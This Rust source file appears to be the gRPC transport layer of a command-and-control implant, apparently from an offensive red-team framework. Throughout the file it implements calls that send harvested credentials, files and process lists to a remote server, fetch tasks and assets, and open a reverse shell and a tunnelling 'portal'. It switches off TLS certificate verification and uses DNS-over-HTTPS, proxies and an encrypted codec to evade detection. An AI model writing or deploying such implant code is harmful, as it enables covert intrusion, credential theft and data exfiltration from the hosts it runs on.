use anyhow::Result;
use http::Uri;
use pb::c2::*;
use pb::config::Config;
use std::str::FromStr;
use std::sync::mpsc::{Receiver, Sender};
use tonic::GrpcMethod;
use tonic::Request;

#[cfg(feature = "doh")]
use crate::dns_resolver::doh::DohProvider;
use crate::Transport;

use crate::tls_utils::AcceptAllCertVerifier;
use std::sync::Arc;
use std::time::Duration;

#[derive(Clone)]
struct ForceHttpsConnector<C> {
    inner: C,
    force: bool,
}

impl<C> tower::Service<http::Uri> for ForceHttpsConnector<C>
where
    C: tower::Service<http::Uri> + Clone + Send + 'static,
    C::Response: Send,
    C::Error: Send,
    C::Future: Send,
{
    type Response = C::Response;
    type Error = C::Error;
    type Future = C::Future;

    fn poll_ready(
        &mut self,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::result::Result<(), Self::Error>> {
        self.inner.poll_ready(cx)
    }

    fn call(&mut self, uri: http::Uri) -> Self::Future {
        if self.force {
            let mut parts = uri.into_parts();
            if parts.scheme == Some(http::uri::Scheme::HTTP) {
                parts.scheme = Some(http::uri::Scheme::HTTPS);
            }
            let https_uri = http::Uri::from_parts(parts).expect("valid uri");
            self.inner.call(https_uri)
        } else {
            self.inner.call(uri)
        }
    }
}

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";

#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone)]
pub struct GRPC {
    grpc: Option<tonic::client::Grpc<tonic::transport::Channel>>,
}

impl Transport for GRPC {
    fn init() -> Self {
        GRPC { grpc: None }
    }

    fn new(config: Config) -> Result<Self> {
        // Extract URI and EXTRA from config using helper functions
        let callback = crate::transport::extract_uri_from_config(&config)?;
        let extra_map = crate::transport::extract_extra_from_config(&config);

        // Tonic 0.14+ might fail with "Connecting to HTTPS without TLS enabled" if we use https:// scheme
        // even if we provide a TLS-enabled connector. We workaround this by using http:// scheme
        // internally and forcing https:// in the connector.
        let internal_callback = if callback.starts_with("https://") {
            callback.replacen("https://", "http://", 1)
        } else {
            callback.clone()
        };

        let endpoint = tonic::transport::Endpoint::from_shared(internal_callback)?;

        #[cfg(feature = "doh")]
        let doh: Option<&String> = extra_map.get("doh");

        // Create base HTTP connector (either DOH-enabled or system DNS)
        #[cfg(feature = "doh")]
        let mut http = match doh {
            Some(provider_str) => {
                let provider = match provider_str.to_lowercase().as_str() {
                    "cloudflare" => DohProvider::Cloudflare,
                    "google" => DohProvider::Google,
                    "quad9" => DohProvider::Quad9,
                    _ => DohProvider::Cloudflare,
                };
                crate::dns_resolver::doh::create_doh_connector_hyper1(provider)?
            }
            None => {
                // Use system DNS when DOH not explicitly requested
                crate::dns_resolver::doh::create_doh_connector_hyper1(DohProvider::System)?
            }
        };

        #[cfg(not(feature = "doh"))]
        let mut http = hyper_util::client::legacy::connect::HttpConnector::new();

        let proxy_uri = extra_map.get("http_proxy");

        http.enforce_http(false);
        http.set_nodelay(true);

        let tls_config = rustls::ClientConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_safe_default_protocol_versions()
        .expect("failed to set default protocol versions")
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
        .with_no_client_auth();

        let connector = hyper_rustls::HttpsConnectorBuilder::new()
            .with_tls_config(tls_config)
            .https_or_http()
            .enable_http2()
            .wrap_connector(http);

        // Wrap connector to force HTTPS if the original callback was HTTPS
        let connector = ForceHttpsConnector {
            inner: connector,
            force: callback.starts_with("https://"),
        };

        let channel = match proxy_uri {
            Some(proxy_uri_string) => {
                let proxy = hyper_http_proxy::Proxy::new(
                    hyper_http_proxy::Intercept::All,
                    Uri::from_str(proxy_uri_string.as_str())?,
                );
                let proxy_connector =
                    hyper_http_proxy::ProxyConnector::from_proxy(connector, proxy)?;

                endpoint
                    .rate_limit(1, Duration::from_millis(25))
                    .connect_with_connector_lazy(proxy_connector)
            }
            #[allow(non_snake_case) /* None is a reserved keyword */]
            None => endpoint
                .rate_limit(1, Duration::from_millis(25))
                .connect_with_connector_lazy(connector),
        };

        let grpc = tonic::client::Grpc::new(channel);
        Ok(Self { grpc: Some(grpc) })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        tokio::spawn(async move {
            loop {
                let msg = match stream.message().await {
                    Ok(maybe_msg) => match maybe_msg {
                        Some(msg) => msg,
                        #[allow(non_snake_case) /* None is a reserved keyword */]
                        None => {
                            break;
                        }
                    },
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to download file: {}: {}", filename, _err);

                        return;
                    }
                };
                match tx.send(msg) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to send downloaded file chunk: {}: {}",
                            filename,
                            _err
                        );

                        return;
                    }
                }
            }
        });
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let resp = self.report_task_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Wrap PTY output receiver in stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        // Open gRPC Bi-Directional Stream
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        // Spawn task to deliver PTY input
        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to receive gRPC stream response: {}", _err);

                    None
                }
            } {
                match tx.send(msg).await {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to queue pty input: {}", _err);

                        return;
                    }
                }
            }
        });

        Ok(())
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        // Wrap output receiver in stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        // Open gRPC Bi-Directional Stream
        let resp = self.create_portal_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        // Spawn task to deliver portal input
        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to receive gRPC stream response: {}", _err);

                    None
                }
            } {
                match tx.send(msg).await {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to queue portal input: {}", _err);

                        return;
                    }
                }
            }
        });

        Ok(())
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportGrpc
    }

    fn is_active(&self) -> bool {
        self.grpc.is_some()
    }

    fn name(&self) -> &'static str {
        "grpc"
    }

    fn list_available(&self) -> Vec<String> {
        vec!["grpc".to_string()]
    }
}

impl GRPC {
    ///
    /// Contact the server for new tasks to execute.
    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Download a file from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc
            .as_mut()
            .unwrap()
            .server_streaming(req, path, codec)
            .await
    }

    ///
    /// Report a credential.
    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    ///
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc
            .as_mut()
            .unwrap()
            .client_streaming(req, path, codec)
            .await
    }

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Report execution output for a task.
    pub async fn report_task_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }

    async fn create_portal_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = CreatePortalRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<CreatePortalResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CREATE_PORTAL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "CreatePortal"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }
}
